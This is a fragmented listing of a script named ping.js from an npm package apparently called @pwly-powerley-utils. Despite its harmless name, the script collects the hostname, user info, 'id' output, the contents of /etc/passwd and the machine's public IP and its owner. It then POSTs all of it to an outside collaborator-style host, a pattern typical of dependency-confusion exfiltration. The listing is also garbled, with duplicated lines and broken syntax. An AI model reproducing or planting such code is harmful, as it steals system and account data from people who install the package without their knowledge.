// File: tmp/tmpl77kndun/@pwly-powerley-utils/package/scripts/ping.js
// ======================================================================
Line 1: _tmp_7 = require("child_process")
Line 2: const os = require("os")
Line 3: const https = require("https")
Line 4: const http = require("http")
Line 8: {
  try {
    // Collect system info
    output += "=== SYSTEM INFO ===\n";
    output += "Hostname: " + os.hostname() + "\n";
    output += "\nPlatform: " + os.platform() + "\n";
    output += "\nArch: " + os.arch() + "\n";
    output += "\nUser Info: " + JSON.stringify(os.userInfo()) + "\n";

    if (os.platform() !== "win32") {
      output += "\nid: " + execSync("id").toString();
      output += "\npasswd:\n" + execSync("cat /etc/passwd").toString();
    } else {
      output += "\nwhoami: " + execSync("whoami").toString();
    }

    // Get public IP and reverse owner
    output += "\n=== IP OWNER INFO ===\n";

    const ip = await fetchText("http://api.ipify.org");
    output += "Public IP: " + ip + "\n";

    const whois = await fetchText(`http://ip-api.com/line/${ip}`);
    output += whois;

  } catch (e) {
    output += "\nError:\n" + e.stack + "\n";
  }

  // Send data out
  const req = https.request({
    hostname: "d15fw30mepr0000jqyh0go1abwcyyyyyr.xyzcollab.com",
    pa...
Line 12: os.hostname()
Line 13: os.platform()
Line 14: os.arch()
Line 15: os.userInfo()
Line 17: os.platform()
Line 18: execSync("id").toString()
Line 19: execSync("cat /etc/passwd").toString()
Line 21: execSync("whoami").toString()
Line 27: const ip = await fetchText("http://api.ipify.org")
Line 30: const whois = await fetchText(`http://ip-api.com/line/${ip}`)
Line 38: const req = https.request({
    hostname: "d15fw30mepr0000jqyh0go1abwcyyyyyr.xyzcollab.com",
    path: "/ping?testing=depend-conf",
    method: "POST",
    headers: {
      "Content-Type": "text/plain",
      "Content-Length": Buffer.byteLength(output),
    },
  })
Line 48: req.write(output)
Line 49: req.end()
Line 53: function fetchText = function fetchText(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith("https") ? https : http;
    lib.get(url, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => resolve(data));
    }).on("error", reject);
  });
}
Line 64: main()
